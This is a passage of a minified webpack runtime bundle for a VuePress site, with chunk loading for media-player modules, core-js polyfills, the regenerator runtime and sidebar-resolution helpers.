(window.webpackJsonp=window.webpackJsonp||[]).push([[1],[]]);!function(n){function e(e){for(var r,i,s=e[0],c=e[1],l=e[2],d=0,u=[];d<s.length;d++)i=s[d],Object.prototype.hasOwnProperty.call(a,i)&&a[i]&&u.push(a[i][0]),a[i]=0;for(r in c)Object.prototype.hasOwnProperty.call(c,r)&&(n[r]=c[r]);for(p&&p(e);u.length;)u.shift()();return o.push.apply(o,l||[]),t()}function t(){for(var n,e=0;e<o.length;e++){for(var t=o[e],r=!0,s=1;s<t.length;s++){var c=t[s];0!==a[c]&&(r=!1)}r&&(o.splice(e--,1),n=i(i.s=t[0]))}return n}var r={},a={2:0},o=[];function i(e){if(r[e])return r[e].exports;var t=r[e]={i:e,l:!1,exports:{}};return n[e].call(t.exports,t,t.exports,i),t.l=!0,t.exports}i.e=function(n){var e=[],t=a[n];if(0!==t)if(t)e.push(t[2]);else{var r=new Promise((function(e,r){t=a[n]=[e,r]}));e.push(t[2]=r);var o,s=document.createElement("script");s.charset="utf-8",s.timeout=120,i.nc&&s.setAttribute("nonce",i.nc),s.src=function(n){return i.p+"assets/js/"+({3:"vendors~aplayer",4:"vendors~artplayer",5:"vendors~dash",6:"vendors~dplayer",7:"vendors~hls",8:"vendors~mpegts",9:"vendors~shaka-player",10:"vendors~webtorrent"}[n]||n)+"."+{0:"e0c47f53",3:"e8507ad6",4:"66bb087d",5:"0bbb404d",6:"78936917",7:"1bdfaf9f",8:"97ee1f4b",9:"301276db",10:"5c2abfbd",11:"5871899e",12:"431bcefd",13:"fb76bc65",14:"d388e61d",15:"1d88d902",16:"ddf7a44e",17:"942b54fb",18:"11ee4f6a",19:"4183631c",20:"d068ac6d",21:"55619b28",22:"8e7abe53",23:"0309612c",24:"a28e2ee9",25:"7a664113",26:"f150d730",27:"e7a93dfe",28:"4fd74838",29:"8e9fe76b",30:"7df3db43",31:"ecc35b5f",32:"a4568c9e",33:"160364ab",34:"e7de7813",35:"7e8922ff",36:"511b9044",37:"c8c6a275",38:"29e6fe09",39:"6e03161c",40:"baeacd08",41:"69a01fc1",42:"f9c95a4a",43:"c67c8d33",44:"002db34f",45:"c2be514f",46:"b1618444",47:"ce9289b0",48:"a12658e7",49:"a0c7328f",50:"bbd24ec9",51:"89ee8f54",52:"7a27963e",53:"d6d8fc4a",54:"202072ec",55:"ea78b93d",56:"51a524c1",57:"35546514",58:"2c898e8c",59:"cccfb20b",60:"75cda1d3",61:"6d6fc575",62:"d768ff07",63:"489e09ed",64:"27f5c4fd",65:"dff2981d",66:"61d41026",67:"deef71ea",68:"2a17d392",69:"073d8b47",70:"40cbf8fc",71:"415d45eb",72:"b70fb6aa",73:"e6bc7a89",74:"ceeb8eba",75:"b77af8ea",76:"981fbe2c",77:"ac69a6e8",78:"eabd5bec",79:"ec31f1e3",80:"3e3eab34",81:"be141705",82:"17bcaa4d",83:"5c41485d",84:"638e523e"}[n]+".js"}(n);var c=new Error;o=function(e){s.onerror=s.onload=null,clearTimeout(l);var t=a[n];if(0!==t){if(t){var r=e&&("load"===e.type?"missing":e.type),o=e&&e.target&&e.target.src;c.message="Loading chunk "+n+" failed.\n("+r+": "+o+")",c.name="ChunkLoadError",c.type=r,c.request=o,t[1](c)}a[n]=void 0}};var l=setTimeout((function(){o({type:"timeout",target:s})}),12e4);s.onerror=s.onload=o,document.head.appendChild(s)}return Promise.all(e)},i.m=n,i.c=r,i.d=function(n,e,t){i.o(n,e)||Object.defineProperty(n,e,{enumerable:!0,get:t})},i.r=function(n){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(n,"__esModule",{value:!0})},i.t=function(n,e){if(1&e&&(n=i(n)),8&e)return n;if(4&e&&"object"==typeof n&&n&&n.__esModule)return n;var t=Object.create(null);if(i.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:n}),2&e&&"string"!=typeof n)for(var r in n)i.d(t,r,function(e){return n[e]}.bind(null,r));return t},i.n=function(n){var e=n&&n.__esModule?function(){return n.default}:function(){return n};return i.d(e,"a",e),e},i.o=function(n,e){return Object.prototype.hasOwnProperty.call(n,e)},i.p="/",i.oe=function(n){throw console.error(n),n};var s=window.webpackJsonp=window.webpackJsonp||[],c=s.push.bind(s);s.push=e,s=s.slice();for(var l=0;l<s.length;l++)e(s[l]);var p=c;o.push([240,1]),t()}([function(n,e){var t=function(n){return n&&n.Math==Math&&n};n.exports=t("object"==typeof globalThis&&globalThis)||t("object"==typeof window&&window)||t("object"==typeof self&&self)||t("object"==typeof global&&global)||function(){return this}()||Function("return this")()},function(n,e,t){var r=t(68),a=Function.prototype,o=a.bind,i=a.call,s=r&&o.bind(i,i);n.exports=r?function(n){return n&&s(n)}:function(n){return n&&function(){return i.apply(n,arguments)}}},function(n,e,t){var r=t(0),a=t(39).f,o=t(32),i=t(15),s=t(118),c=t(125),l=t(93);n.exports=function(n,e){var t,p,d,u,m,g=n.target,f=n.global,b=n.stat;if(t=f?r:b?r[g]||s(g,{}):(r[g]||{}).prototype)for(p in e){if(u=e[p],d=n.noTargetGet?(m=a(t,p))&&m.value:t[p],!l(f?p:g+(b?".":"#")+p,n.forced)&&void 0!==d){if(typeof u==typeof d)continue;c(u,d)}(n.sham||d&&d.sham)&&o(u,"sham",!0),i(t,p,u,n)}}},function(n,e){n.exports=function(n){try{return!!n()}catch(n){return!0}}},function(n,e,t){"use strict";t.d(e,"a",(function(){return a}));t(5);function r(n,e,t,r,a,o,i){try{var s=n[o](i),c=s.value}catch(n){return void t(n)}s.done?e(c):Promise.resolve(c).then(r,a)}function a(n){return function(){var e=this,t=arguments;return new Promise((function(a,o){var i=n.apply(e,t);function s(n){r(i,a,o,s,c,"next",n)}function c(n){r(i,a,o,s,c,"throw",n)}s(void 0)}))}}},function(n,e,t){var r=t(128),a=t(15),o=t(256);r||a(Object.prototype,"toString",o,{unsafe:!0})},function(n,e,t){var r=t(0),a=t(84),o=t(12),i=t(85),s=t(119),c=t(159),l=a("wks"),p=r.Symbol,d=p&&p.for,u=c?p:p&&p.withoutSetter||i;n.exports=function(n){if(!o(l,n)||!s&&"string"!=typeof l[n]){var e="Symbol."+n;s&&o(p,n)?l[n]=p[n]:l[n]=c&&d?d(e):u(e)}return l[n]}},function(n,e){n.exports=function(n){return"function"==typeof n}},function(n,e,t){var r=t(3);n.exports=!r((function(){return 7!=Object.defineProperty({},1,{get:function(){return 7}})[1]}))},function(n,e,t){var r=t(0),a=t(10),o=r.String,i=r.TypeError;n.exports=function(n){if(a(n))return n;throw i(o(n)+" is not an object")}},function(n,e,t){var r=t(7);n.exports=function(n){return"object"==typeof n?null!==n:r(n)}},function(n,e,t){var r=t(0),a=t(82),o=r.String;n.exports=function(n){if("Symbol"===a(n))throw TypeError("Cannot convert a Symbol value to a string");return o(n)}},function(n,e,t){var r=t(1),a=t(21),o=r({}.hasOwnProperty);n.exports=Object.hasOwn||function(n,e){return o(a(n),e)}},function(n,e,t){var r=t(0),a=t(8),o=t(161),i=t(160),s=t(9),c=t(87),l=r.TypeError,p=Object.defineProperty,d=Object.getOwnPropertyDescriptor;e.f=a?i?function(n,e,t){if(s(n),e=c(e),s(t),"function"==typeof n&&"prototype"===e&&"value"in t&&"writable"in t&&!t.writable){var r=d(n,e);r&&r.writable&&(n[e]=t.value,t={configurable:"configurable"in t?t.configurable:r.configurable,enumerable:"enumerable"in t?t.enumerable:r.enumerable,writable:!1})}return p(n,e,t)}:p:function(n,e,t){if(s(n),e=c(e),s(t),o)try{return p(n,e,t)}catch(n){}if("get"in t||"set"in t)throw l("Accessors not supported");return"value"in t&&(n[e]=t.value),n}},function(n,e,t){var r=t(68),a=Function.prototype.call;n.exports=r?a.bind(a):function(){return a.apply(a,arguments)}},function(n,e,t){var r=t(0),a=t(7),o=t(12),i=t(32),s=t(118),c=t(92),l=t(35),p=t(81).CONFIGURABLE,d=l.get,u=l.enforce,m=String(String).split("String");(n.exports=function(n,e,t,c){var l,d=!!c&&!!c.unsafe,g=!!c&&!!c.enumerable,f=!!c&&!!c.noTargetGet,b=c&&void 0!==c.name?c.name:e;a(t)&&("Symbol("===String(b).slice(0,7)&&(b="["+String(b).replace(/^Symbol\(([^)]*)\)/,"$1")+"]"),(!o(t,"name")||p&&t.name!==b)&&i(t,"name",b),(l=u(t)).source||(l.source=m.join("string"==typeof b?b:""))),n!==r?(d?!f&&n[e]&&(g=!0):delete n[e],g?n[e]=t:i(n,e,t)):g?n[e]=t:s(e,t)})(Function.prototype,"toString",(function(){return a(this)&&d(this).source||c(this)}))},function(n,e,t){"use strict";var r=t(179).charAt,a=t(11),o=t(35),i=t(165),s=o.set,c=o.getterFor("String Iterator");i(String,"String",(function(n){s(this,{type:"String Iterator",string:a(n),index:0})}),(function(){var n,e=c(this),t=e.string,a=e.index;return a>=t.length?{value:void 0,done:!0}:(n=r(t,a),e.index+=n.length,{value:n,done:!1})}))},function(n,e,t){"use strict";t.d(e,"a",(function(){return r}));t(105);function r(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}},function(n,e,t){var r=t(0),a=t(180),o=t(181),i=t(152),s=t(32),c=t(6),l=c("iterator"),p=c("toStringTag"),d=i.values,u=function(n,e){if(n){if(n[l]!==d)try{s(n,l,d)}catch(e){n[l]=d}if(n[p]||s(n,p,e),a[e])for(var t in i)if(n[t]!==i[t])try{s(n,t,i[t])}catch(e){n[t]=i[t]}}};for(var m in a)u(r[m]&&r[m].prototype,m);u(o,"DOMTokenList")},function(n,e,t){var r=t(0).TypeError;n.exports=function(n){if(null==n)throw r("Can't call method on "+n);return n}},function(n,e,t){var r=function(n){"use strict";var e=Object.prototype,t=e.hasOwnProperty,r="function"==typeof Symbol?Symbol:{},a=r.iterator||"@@iterator",o=r.asyncIterator||"@@asyncIterator",i=r.toStringTag||"@@toStringTag";function s(n,e,t){return Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}),n[e]}try{s({},"")}catch(n){s=function(n,e,t){return n[e]=t}}function c(n,e,t,r){var a=e&&e.prototype instanceof d?e:d,o=Object.create(a.prototype),i=new S(r||[]);return o._invoke=function(n,e,t){var r="suspendedStart";return function(a,o){if("executing"===r)throw new Error("Generator is already running");if("completed"===r){if("throw"===a)throw o;return E()}for(t.method=a,t.arg=o;;){var i=t.delegate;if(i){var s=k(i,t);if(s){if(s===p)continue;return s}}if("next"===t.method)t.sent=t._sent=t.arg;else if("throw"===t.method){if("suspendedStart"===r)throw r="completed",t.arg;t.dispatchException(t.arg)}else"return"===t.method&&t.abrupt("return",t.arg);r="executing";var c=l(n,e,t);if("normal"===c.type){if(r=t.done?"completed":"suspendedYield",c.arg===p)continue;return{value:c.arg,done:t.done}}"throw"===c.type&&(r="completed",t.method="throw",t.arg=c.arg)}}}(n,t,i),o}function l(n,e,t){try{return{type:"normal",arg:n.call(e,t)}}catch(n){return{type:"throw",arg:n}}}n.wrap=c;var p={};function d(){}function u(){}function m(){}var g={};s(g,a,(function(){return this}));var f=Object.getPrototypeOf,b=f&&f(f(j([])));b&&b!==e&&t.call(b,a)&&(g=b);var h=m.prototype=d.prototype=Object.create(g);function v(n){["next","throw","return"].forEach((function(e){s(n,e,(function(n){return this._invoke(e,n)}))}))}function y(n,e){var r;this._invoke=function(a,o){function i(){return new e((function(r,i){!function r(a,o,i,s){var c=l(n[a],n,o);if("throw"!==c.type){var p=c.arg,d=p.value;return d&&"object"==typeof d&&t.call(d,"__await")?e.resolve(d.__await).then((function(n){r("next",n,i,s)}),(function(n){r("throw",n,i,s)})):e.resolve(d).then((function(n){p.value=n,i(p)}),(function(n){return r("throw",n,i,s)}))}s(c.arg)}(a,o,r,i)}))}return r=r?r.then(i,i):i()}}function k(n,e){var t=n.iterator[e.method];if(void 0===t){if(e.delegate=null,"throw"===e.method){if(n.iterator.return&&(e.method="return",e.arg=void 0,k(n,e),"throw"===e.method))return p;e.method="throw",e.arg=new TypeError("The iterator does not provide a 'throw' method")}return p}var r=l(t,n.iterator,e.arg);if("throw"===r.type)return e.method="throw",e.arg=r.arg,e.delegate=null,p;var a=r.arg;return a?a.done?(e[n.resultName]=a.value,e.next=n.nextLoc,"return"!==e.method&&(e.method="next",e.arg=void 0),e.delegate=null,p):a:(e.method="throw",e.arg=new TypeError("iterator result is not an object"),e.delegate=null,p)}function x(n){var e={tryLoc:n[0]};1 in n&&(e.catchLoc=n[1]),2 in n&&(e.finallyLoc=n[2],e.afterLoc=n[3]),this.tryEntries.push(e)}function w(n){var e=n.completion||{};e.type="normal",delete e.arg,n.completion=e}function S(n){this.tryEntries=[{tryLoc:"root"}],n.forEach(x,this),this.reset(!0)}function j(n){if(n){var e=n[a];if(e)return e.call(n);if("function"==typeof n.next)return n;if(!isNaN(n.length)){var r=-1,o=function e(){for(;++r<n.length;)if(t.call(n,r))return e.value=n[r],e.done=!1,e;return e.value=void 0,e.done=!0,e};return o.next=o}}return{next:E}}function E(){return{value:void 0,done:!0}}return u.prototype=m,s(h,"constructor",m),s(m,"constructor",u),u.displayName=s(m,i,"GeneratorFunction"),n.isGeneratorFunction=function(n){var e="function"==typeof n&&n.constructor;return!!e&&(e===u||"GeneratorFunction"===(e.displayName||e.name))},n.mark=function(n){return Object.setPrototypeOf?Object.setPrototypeOf(n,m):(n.__proto__=m,s(n,i,"GeneratorFunction")),n.prototype=Object.create(h),n},n.awrap=function(n){return{__await:n}},v(y.prototype),s(y.prototype,o,(function(){return this})),n.AsyncIterator=y,n.async=function(e,t,r,a,o){void 0===o&&(o=Promise);var i=new y(c(e,t,r,a),o);return n.isGeneratorFunction(t)?i:i.next().then((function(n){return n.done?n.value:i.next()}))},v(h),s(h,i,"Generator"),s(h,a,(function(){return this})),s(h,"toString",(function(){return"[object Generator]"})),n.keys=function(n){var e=[];for(var t in n)e.push(t);return e.reverse(),function t(){for(;e.length;){var r=e.pop();if(r in n)return t.value=r,t.done=!1,t}return t.done=!0,t}},n.values=j,S.prototype={constructor:S,reset:function(n){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(w),!n)for(var e in this)"t"===e.charAt(0)&&t.call(this,e)&&!isNaN(+e.slice(1))&&(this[e]=void 0)},stop:function(){this.done=!0;var n=this.tryEntries[0].completion;if("throw"===n.type)throw n.arg;return this.rval},dispatchException:function(n){if(this.done)throw n;var e=this;function r(t,r){return i.type="throw",i.arg=n,e.next=t,r&&(e.method="next",e.arg=void 0),!!r}for(var a=this.tryEntries.length-1;a>=0;--a){var o=this.tryEntries[a],i=o.completion;if("root"===o.tryLoc)return r("end");if(o.tryLoc<=this.prev){var s=t.call(o,"catchLoc"),c=t.call(o,"finallyLoc");if(s&&c){if(this.prev<o.catchLoc)return r(o.catchLoc,!0);if(this.prev<o.finallyLoc)return r(o.finallyLoc)}else if(s){if(this.prev<o.catchLoc)return r(o.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<o.finallyLoc)return r(o.finallyLoc)}}}},abrupt:function(n,e){for(var r=this.tryEntries.length-1;r>=0;--r){var a=this.tryEntries[r];if(a.tryLoc<=this.prev&&t.call(a,"finallyLoc")&&this.prev<a.finallyLoc){var o=a;break}}o&&("break"===n||"continue"===n)&&o.tryLoc<=e&&e<=o.finallyLoc&&(o=null);var i=o?o.completion:{};return i.type=n,i.arg=e,o?(this.method="next",this.next=o.finallyLoc,p):this.complete(i)},complete:function(n,e){if("throw"===n.type)throw n.arg;return"break"===n.type||"continue"===n.type?this.next=n.arg:"return"===n.type?(this.rval=this.arg=n.arg,this.method="return",this.next="end"):"normal"===n.type&&e&&(this.next=e),p},finish:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var t=this.tryEntries[e];if(t.finallyLoc===n)return this.complete(t.completion,t.afterLoc),w(t),p}},catch:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var t=this.tryEntries[e];if(t.tryLoc===n){var r=t.completion;if("throw"===r.type){var a=r.arg;w(t)}return a}}throw new Error("illegal catch attempt")},delegateYield:function(n,e,t){return this.delegate={iterator:j(n),resultName:e,nextLoc:t},"next"===this.method&&(this.arg=void 0),p}},n}(n.exports);try{regeneratorRuntime=r}catch(n){"object"==typeof globalThis?globalThis.regeneratorRuntime=r:Function("r","regeneratorRuntime = r")(r)}},function(n,e,t){var r=t(0),a=t(19),o=r.Object;n.exports=function(n){return o(a(n))}},function(n,e,t){var r=t(0),a=t(7),o=function(n){return a(n)?n:void 0};n.exports=function(n,e){return arguments.length<2?o(r[n]):r[n]&&r[n][e]}},function(n,e,t){"use strict";t.d(e,"a",(function(){return o}));t(46),t(74),t(34),t(5),t(383),t(26),t(27),t(182),t(384),t(105);var r=t(17);function a(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function o(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?a(Object(t),!0).forEach((function(e){Object(r.a)(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}},function(n,e,t){"use strict";var r=this&&this.__assign||function(){return(r=Object.assign||function(n){for(var e,t=1,r=arguments.length;t<r;t++)for(var a in e=arguments[t])Object.prototype.hasOwnProperty.call(e,a)&&(n[a]=e[a]);return n}).apply(this,arguments)},a=this&&this.__read||function(n,e){var t="function"==typeof Symbol&&n[Symbol.iterator];if(!t)return n;var r,a,o=t.call(n),i=[];try{for(;(void 0===e||e-- >0)&&!(r=o.next()).done;)i.push(r.value)}catch(n){a={error:n}}finally{try{r&&!r.done&&(t=o.return)&&t.call(o)}finally{if(a)throw a.error}}return i},o=this&&this.__spreadArray||function(n,e,t){if(t||2===arguments.length)for(var r,a=0,o=e.length;a<o;a++)!r&&a in e||(r||(r=Array.prototype.slice.call(e,0,a)),r[a]=e[a]);return n.concat(r||Array.prototype.slice.call(e))};Object.defineProperty(e,"__esModule",{value:!0});var i=function(n){if("object"==typeof n&&null!==n){if("function"==typeof Object.getPrototypeOf){var e=Object.getPrototypeOf(n);return e===Object.prototype||null===e}return"[object Object]"===Object.prototype.toString.call(n)}return!1},s=function(){for(var n=[],e=0;e<arguments.length;e++)n[e]=arguments[e];return n.reduce((function(n,e){return Object.keys(e).forEach((function(t){Array.isArray(n[t])&&Array.isArray(e[t])?n[t]=s.options.mergeArrays?Array.from(new Set(n[t].concat(e[t]))):e[t]:i(n[t])&&i(e[t])?n[t]=s(n[t],e[t]):n[t]=e[t]})),n}),{})},c={mergeArrays:!0};s.options=c,s.withOptions=function(n){for(var e=[],t=1;t<arguments.length;t++)e[t-1]=arguments[t];s.options=r({mergeArrays:!0},n);var i=s.apply(void 0,o([],a(e),!1));return s.options=c,i},e.default=s},function(n,e,t){var r=t(67),a=t(19);n.exports=function(n){return r(a(n))}},function(n,e,t){"use strict";var r=t(2),a=t(184);r({target:"Array",proto:!0,forced:[].forEach!=a},{forEach:a})},function(n,e,t){var r=t(0),a=t(180),o=t(181),i=t(184),s=t(32),c=function(n){if(n&&n.forEach!==i)try{s(n,"forEach",i)}catch(e){n.forEach=i}};for(var l in a)a[l]&&c(r[l]&&r[l].prototype);c(o)},function(n,e,t){"use strict";var r=t(2),a=t(98);r({target:"RegExp",proto:!0,forced:/./.exec!==a},{exec:a})},function(n,e){n.exports=!1},function(n,e,t){var r=t(15),a=t(272),o=Error.prototype;o.toString!==a&&r(o,"toString",a)},function(n,e,t){var r=t(1),a=r({}.toString),o=r("".slice);n.exports=function(n){return o(a(n),8,-1)}},function(n,e,t){var r=t(8),a=t(13),o=t(56);n.exports=r?function(n,e,t){return a.f(n,e,o(1,t))}:function(n,e,t){return n[e]=t,n}},function(n,e,t){var r=t(47);n.exports=function(n){return r(n.length)}},function(n,e,t){"use strict";var r=t(2),a=t(57).filter;r({target:"Array",proto:!0,forced:!t(96)("filter")},{filter:function(n){return a(this,n,arguments.length>1?arguments[1]:void 0)}})},function(n,e,t){var r,a,o,i=t(242),s=t(0),c=t(1),l=t(10),p=t(32),d=t(12),u=t(117),m=t(91),g=t(69),f=s.TypeError,b=s.WeakMap;if(i||u.state){var h=u.state||(u.state=new b),v=c(h.get),y=c(h.has),k=c(h.set);r=function(n,e){if(y(h,n))throw new f("Object already initialized");return e.facade=n,k(h,n,e),e},a=function(n){return v(h,n)||{}},o=function(n){return y(h,n)}}else{var x=m("state");g[x]=!0,r=function(n,e){if(d(n,x))throw new f("Object already initialized");return e.facade=n,p(n,x,e),e},a=function(n){return d(n,x)?n[x]:{}},o=function(n){return d(n,x)}}n.exports={set:r,get:a,has:o,enforce:function(n){return o(n)?a(n):r(n,{})},getterFor:function(n){return function(e){var t;if(!l(e)||(t=a(e)).type!==n)throw f("Incompatible receiver, "+n+" required");return t}}}},function(n,e){var t=Array.isArray;n.exports=t},function(n,e,t){var r=t(22);n.exports=r("navigator","userAgent")||""},function(n,e,t){var r=t(1);n.exports=r({}.isPrototypeOf)},function(n,e,t){var r=t(8),a=t(14),o=t(124),i=t(56),s=t(25),c=t(87),l=t(12),p=t(161),d=Object.getOwnPropertyDescriptor;e.f=r?d:function(n,e){if(n=s(n),e=c(e),p)try{return d(n,e)}catch(n){}if(l(n,e))return i(!a(o.f,n,e),n[e])}},function(n,e,t){var r=t(194),a="object"==typeof self&&self&&self.Object===Object&&self,o=r||a||Function("return this")();n.exports=o},function(n,e,t){"use strict";function r(n,e,t,r,a,o,i,s){var c,l="function"==typeof n?n.options:n;if(e&&(l.render=e,l.staticRenderFns=t,l._compiled=!0),r&&(l.functional=!0),o&&(l._scopeId="data-v-"+o),i?(c=function(n){(n=n||this.$vnode&&this.$vnode.ssrContext||this.parent&&this.parent.$vnode&&this.parent.$vnode.ssrContext)||"undefined"==typeof __VUE_SSR_CONTEXT__||(n=__VUE_SSR_CONTEXT__),a&&a.call(this,n),n&&n._registeredComponents&&n._registeredComponents.add(i)},l._ssrRegister=c):a&&(c=s?function(){a.call(this,(l.functional?this.parent:this).$root.$options.shadowRoot)}:a),c)if(l.functional){l._injectStyles=c;var p=l.render;l.render=function(n,e){return c.call(e),p(n,e)}}else{var d=l.beforeCreate;l.beforeCreate=d?[].concat(d,c):[c]}return{exports:n,options:l}}t.d(e,"a",(function(){return r}))},function(n,e,t){var r,a=t(9),o=t(120),i=t(123),s=t(69),c=t(164),l=t(86),p=t(91),d=p("IE_PROTO"),u=function(){},m=function(n){return"<script>"+n+"<\/script>"},g=function(n){n.write(m("")),n.close();var e=n.parentWindow.Object;return n=null,e},f=function(){try{r=new ActiveXObject("htmlfile")}catch(n){}var n,e;f="undefined"!=typeof document?document.domain&&r?g(r):((e=l("iframe")).style.display="none",c.appendChild(e),e.src=String("javascript:"),(n=e.contentWindow.document).open(),n.write(m("document.F=Object")),n.close(),n.F):g(r);for(var t=i.length;t--;)delete f.prototype[i[t]];return f()};s[d]=!0,n.exports=Object.create||function(n,e){var t;return null!==n?(u.prototype=a(n),t=new u,u.prototype=null,t[d]=n):t=f(),void 0===e?t:o.f(t,e)}},function(n,e,t){var r=t(68),a=Function.prototype,o=a.apply,i=a.call;n.exports="object"==typeof Reflect&&Reflect.apply||(r?i.bind(o):function(){return i.apply(o,arguments)})},function(n,e,t){var r=t(0),a=t(7),o=t(89),i=r.TypeError;n.exports=function(n){if(a(n))return n;throw i(o(n)+" is not a function")}},function(n,e,t){"use strict";var r=t(2),a=t(57).map;r({target:"Array",proto:!0,forced:!t(96)("map")},{map:function(n){return a(this,n,arguments.length>1?arguments[1]:void 0)}})},function(n,e,t){var r=t(2),a=t(21),o=t(90);r({target:"Object",stat:!0,forced:t(3)((function(){o(1)}))},{keys:function(n){return o(a(n))}})},function(n,e,t){var r=t(62),a=Math.min;n.exports=function(n){return n>0?a(r(n),9007199254740991):0}},function(n,e,t){var r=t(2),a=t(0),o=t(43),i=t(268),s=a.WebAssembly,c=7!==Error("e",{cause:7}).cause,l=function(n,e){var t={};t[n]=i(n,e,c),r({global:!0,forced:c},t)},p=function(n,e){if(s&&s[n]){var t={};t[n]=i("WebAssembly."+n,e,c),r({target:"WebAssembly",stat:!0,forced:c},t)}};l("Error",(function(n){return function(e){return o(n,this,arguments)}})),l("EvalError",(function(n){return function(e){return o(n,this,arguments)}})),l("RangeError",(function(n){return function(e){return o(n,this,arguments)}})),l("ReferenceError",(function(n){return function(e){return o(n,this,arguments)}})),l("SyntaxError",(function(n){return function(e){return o(n,this,arguments)}})),l("TypeError",(function(n){return function(e){return o(n,this,arguments)}})),l("URIError",(function(n){return function(e){return o(n,this,arguments)}})),p("CompileError",(function(n){return function(e){return o(n,this,arguments)}})),p("LinkError",(function(n){return function(e){return o(n,this,arguments)}})),p("RuntimeError",(function(n){return function(e){return o(n,this,arguments)}}))},function(n,e,t){var r=t(293),a=t(296);n.exports=function(n,e){var t=a(n,e);return r(t)?t:void 0}},function(n,e,t){"use strict";t.d(e,"a",(function(){return a}));t(83);t(74),t(97),t(5),t(134),t(16),t(18);var r=t(108);t(48),t(30);function a(n,e){return function(n){if(Array.isArray(n))return n}(n)||function(n,e){var t=null==n?null:"undefined"!=typeof Symbol&&n[Symbol.iterator]||n["@@iterator"];if(null!=t){var r,a,o=[],i=!0,s=!1;try{for(t=t.call(n);!(i=(r=t.next()).done)&&(o.push(r.value),!e||o.length!==e);i=!0);}catch(n){s=!0,a=n}finally{try{i||null==t.return||t.return()}finally{if(s)throw a}}return o}}(n,e)||Object(r.a)(n,e)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}},function(n,e,t){"use strict";var r=t(2),a=t(0),o=t(3),i=t(65),s=t(10),c=t(21),l=t(33),p=t(73),d=t(155),u=t(96),m=t(6),g=t(60),f=m("isConcatSpreadable"),b=a.TypeError,h=g>=51||!o((function(){var n=[];return n[f]=!1,n.concat()[0]!==n})),v=u("concat"),y=function(n){if(!s(n))return!1;var e=n[f];return void 0!==e?!!e:i(n)};r({target:"Array",proto:!0,forced:!h||!v},{concat:function(n){var e,t,r,a,o,i=c(this),s=d(i,0),u=0;for(e=-1,r=arguments.length;e<r;e++)if(y(o=-1===e?i:arguments[e])){if(u+(a=l(o))>9007199254740991)throw b("Maximum allowed index exceeded");for(t=0;t<a;t++,u++)t in o&&p(s,u,o[t])}else{if(u>=9007199254740991)throw b("Maximum allowed index exceeded");p(s,u++,o)}return s.length=u,s}})},function(n,e,t){"use strict";t.d(e,"e",(function(){return r})),t.d(e,"b",(function(){return o})),t.d(e,"j",(function(){return i})),t.d(e,"g",(function(){return c})),t.d(e,"h",(function(){return l})),t.d(e,"i",(function(){return p})),t.d(e,"c",(function(){return d})),t.d(e,"f",(function(){return u})),t.d(e,"l",(function(){return m})),t.d(e,"m",(function(){return g})),t.d(e,"d",(function(){return b})),t.d(e,"k",(function(){return h})),t.d(e,"n",(function(){return v})),t.d(e,"a",(function(){return k}));t(28),t(53),t(226),t(80),t(225),t(156),t(45),t(26),t(5),t(27),t(34),t(83),t(148),t(116),t(51),t(213),t(30),t(111);var r=/#.*$/,a=/\.(md|html)$/,o=/\/$/,i=/^[a-z]+:/i;function s(n){return decodeURI(n).replace(r,"").replace(a,"")}function c(n){return i.test(n)}function l(n){return/^mailto:/.test(n)}function p(n){return/^tel:/.test(n)}function d(n){if(c(n))return n;if(!n)return"404";var e=n.match(r),t=e?e[0]:"",a=s(n);return o.test(a)?n:a+".html"+t}function u(n,e){var t=n.hash,a=function(n){var e=n&&n.match(r);if(e)return e[0]}(e);return(!a||t===a)&&s(n.path)===s(e)}function m(n,e,t){if(c(e))return{type:"external",path:e};t&&(e=function(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var a=e.split("/");t&&a[a.length-1]||a.pop();for(var o=n.replace(/^\//,"").split("/"),i=0;i<o.length;i++){var s=o[i];".."===s?a.pop():"."!==s&&a.push(s)}""!==a[0]&&a.unshift("");return a.join("/")}(e,t));for(var r=s(e),a=0;a<n.length;a++)if(s(n[a].regularPath)===r)return Object.assign({},n[a],{type:"page",path:d(n[a].path)});return console.error('[vuepress] No matching page found for sidebar item "'.concat(e,'"')),{}}function g(n,e,t,r){var a=t.pages,o=t.themeConfig,i=r&&o.locales&&o.locales[r]||o;if("auto"===(n.frontmatter.sidebar||i.sidebar||o.sidebar))return f(n);var s=i.sidebar||o.sidebar;if(s){var c=function(n,e){if(Array.isArray(e))return{base:"/",config:e};for(var t in e)if(0===(r=n,/(\.html|\/)$/.test(r)?r:r+"/").indexOf(encodeURI(t)))return{base:t,config:e[t]};var r;return{}}(e,s),l=c.base,p=c.config;return"auto"===p?f(n):p?p.map((function(n){return function n(e,t,r){var a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:1;if("string"==typeof e)return m(t,e,r);if(Array.isArray(e))return Object.assign(m(t,e[0],r),{title:e[1]});a>3&&console.error("[vuepress] detected a too deep nested sidebar group.");var o=e.children||[];return 0===o.length&&e.path?Object.assign(m(t,e.path,r),{title:e.title}):{type:"group",path:e.path,title:e.title,sidebarDepth:e.sidebarDepth,initialOpenGroupIndex:e.initialOpenGroupIndex,children:o.map((function(e){return n(e,t,r,a+1)})),collapsable:!1!==e.collapsable}}(n,a,l)})):[]}return[]}function f(n){var 